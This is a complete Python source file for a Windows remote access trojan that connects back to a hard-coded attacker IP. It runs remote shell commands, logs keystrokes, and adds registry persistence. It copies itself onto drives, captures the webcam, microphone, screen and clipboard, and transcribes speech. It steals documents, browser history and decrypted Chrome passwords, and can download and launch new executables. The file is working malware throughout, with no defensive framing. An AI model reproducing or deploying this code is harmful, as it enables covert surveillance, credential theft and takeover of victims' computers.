import socket
import subprocess
import os
import threading
import time
import sys
import shutil
import pyautogui
import cv2
import pickle
import struct
import sounddevice as sd
import scipy.io.wavfile
import speech_recognition as sr
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import win32clipboard
from pynput import keyboard
import ctypes

HOST = "192.168.100.127"  # Attacker machine IP
PORT = 4444            # Attacker port
STREAM_PORT = 9999     # Webcam stream port

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))

def send_file(filepath):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
            client.sendall(f"[FILE_START]{os.path.basename(filepath)}".encode())
            time.sleep(1)
            client.sendall(data + b"[FILE_END]")
    except Exception as e:
        client.send(f"[ERROR]{str(e)}".encode())

def execute_cmd(command):
    if command.startswith("cd "):
        try:
            os.chdir(command[3:])
            client.send(b"[+] Changed directory")
        except Exception as e:
            client.send(str(e).encode())
    else:
        try:
            output = subprocess.getoutput(command)
            client.send(output.encode() if output else b"[No Output]")
        except Exception as e:
            client.send(str(e).encode())

def keylogger():
    def on_press(key):
        try:
            client.send(f"[KEY]{key.char}".encode())
        except:
            client.send(f"[KEY]{str(key)}".encode())
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def auto_spread():
    drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    for drive in drives:
        try:
            shutil.copy2(sys.executable, os.path.join(drive, "system_helper.exe"))
        except:
            pass

def persist():
    try:
        location = os.getenv("APPDATA") + "\\system_service.exe"
        if not os.path.exists(location):
            shutil.copyfile(sys.executable, location)
            subprocess.call(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemService /t REG_SZ /d "{location}" /f', shell=True)
    except:
        pass

def screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("screen.png")
    send_file("screen.png")
    os.remove("screen.png")

def webcam_snap():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("webcam.jpg", frame)
            send_file("webcam.jpg")
            os.remove("webcam.jpg")
        cap.release()
    except Exception as e:
        client.send(f"[ERROR] Webcam: {str(e)}".encode())

def stream_webcam():
    try:
        stream_sock = socket.socket()
        stream_sock.connect((HOST, STREAM_PORT))
        cam = cv2.VideoCapture(0)
        while True:
            ret, frame = cam.read()
            if not ret:
                break
            data = pickle.dumps(frame)
            message = struct.pack("Q", len(data)) + data
            stream_sock.sendall(message)
        cam.release()
        stream_sock.close()
    except:
        pass

def mic_record():
    try:
        duration = 5
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()
        scipy.io.wavfile.write('audio.wav', fs, recording)
        send_file('audio.wav')
        os.remove('audio.wav')
    except Exception as e:
        client.send(f"[ERROR] Mic: {str(e)}".encode())

def speech_to_text():
    r = sr.Recognizer()
    mic = sr.Microphone()
    with mic as source:
        r.adjust_for_ambient_noise(source)
    while True:
        with mic as source:
            audio = r.listen(source)
        try:
            text = r.recognize_google(audio)
            client.send(f"[SPEECH]{text}".encode())
        except:
            pass

def start_speech_recognition():
    t = threading.Thread(target=speech_to_text, daemon=True)
    t.start()

def clipboard_monitor():
    recent_value = ""
    while True:
        win32clipboard.OpenClipboard()
        try:
            data = win32clipboard.GetClipboardData()
            if data != recent_value:
                recent_value = data
                client.send(f"[CLIPBOARD]{data}".encode())
        except:
            pass
        finally:
            win32clipboard.CloseClipboard()
        time.sleep(5)

def idle_seconds():
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [('cbSize', ctypes.c_uint), ('dwTime', ctypes.c_uint)]
    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
    millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
    return millis / 1000.0

def trigger_on_idle(threshold=60):
    while True:
        if idle_seconds() > threshold:
            client.send(b"[IDLE TRIGGER] User is AFK. Capturing screen.")
            screenshot()
        time.sleep(5)

def scrape_files():
    home = os.path.expanduser("~")
    exts = ['.pdf', '.docx', '.txt']
    files_to_send = []
    for root, dirs, files in os.walk(home):
        for file in files:
            if any(file.lower().endswith(ext) for ext in exts):
                files_to_send.append(os.path.join(root, file))
                if len(files_to_send) >= 10:
                    break
        if len(files_to_send) >= 10:
            break
    for f in files_to_send:
        send_file(f)

def get_chrome_history():
    path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default\History"
    temp_path = "History_temp"
    shutil.copy2(path, temp_path)
    conn = sqlite3.connect(temp_path)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
    data = cursor.fetchall()
    history_text = "\n".join([f"{title} - {url}" for url, title, _ in data])
    client.send(f"[BROWSER_HISTORY]\n{history_text}".encode())
    conn.close()
    os.remove(temp_path)

def decrypt_password(encrypted_password, key):
    try:
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except:
        try:
            return str(win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1])
        except:
            return ""

def get_chrome_passwords():
    local_state_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Local State"
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    
    login_db = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    shutil.copy2(login_db, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    for origin_url, username, password in cursor.fetchall():
        if username or password:
            decrypted = decrypt_password(password, key)
            client.send(f"[CREDENTIALS] {origin_url} | {username} | {decrypted}".encode())
    conn.close()
    os.remove("Loginvault.db")

def self_update(new_exe_url):
    try:
        import urllib.request
        new_path = os.getenv("APPDATA") + "\\updated.exe"
        urllib.request.urlretrieve(new_exe_url, new_path)
        os.startfile(new_path)
        client.send(b"[+] Update launched. Exiting.")
        os._exit(0)
    except Exception as e:
        client.send(f"[ERROR] Self-update failed: {str(e)}".encode())

def surveillance_loop():
    while True:
        webcam_snap()
        mic_record()
        screenshot()
        time.sleep(30)

def listen():
    while True:
        command = client.recv(1024).decode()
        if not command:
            break

        if command == "exit":
            break
        elif command.startswith("cd "):
            execute_cmd(command)
        elif command == "start_keylogger":
            threading.Thread(target=keylogger, daemon=True).start()
            client.send(b"[+] Keylogger started")
        elif command == "spread":
            threading.Thread(target=auto_spread).start()
            client.send(b"[+] Spreader deployed")
        elif command == "persist":
            persist()
            client.send(b"[+] Persistence added")
        elif command == "screenshot":
            screenshot()
        elif command == "webcam":
            webcam_snap()
        elif command == "stream":
            threading.Thread(target=stream_webcam, daemon=True).start()
        elif command == "mic":
            mic_record()
        elif command == "start_speech_recognition":
            start_speech_recognition()
            client.send(b"[+] Speech recognition started")
        elif command == "start_clipboard":
            threading.Thread(target=clipboard_monitor, daemon=True).start()
            client.send(b"[+] Clipboard monitor started")
        elif command == "idle":
            threading.Thread(target=trigger_on_idle, daemon=True).start()
            client.send(b"[+] Idle trigger started")
        elif command == "scrape_files":
            scrape_files()
        elif command == "get_history":
            get_chrome_history()
        elif command == "get_passwords":
            get_chrome_passwords()
        elif command.startswith("self_update "):
            url = command.split(" ",1)[1]
            self_update(url)
        elif command.startswith("download "):
            filepath = command.split(" ",1)[1]
            send_file(filepath)
        elif command:
            execute_cmd(command)

persist()
listen()
client.close()
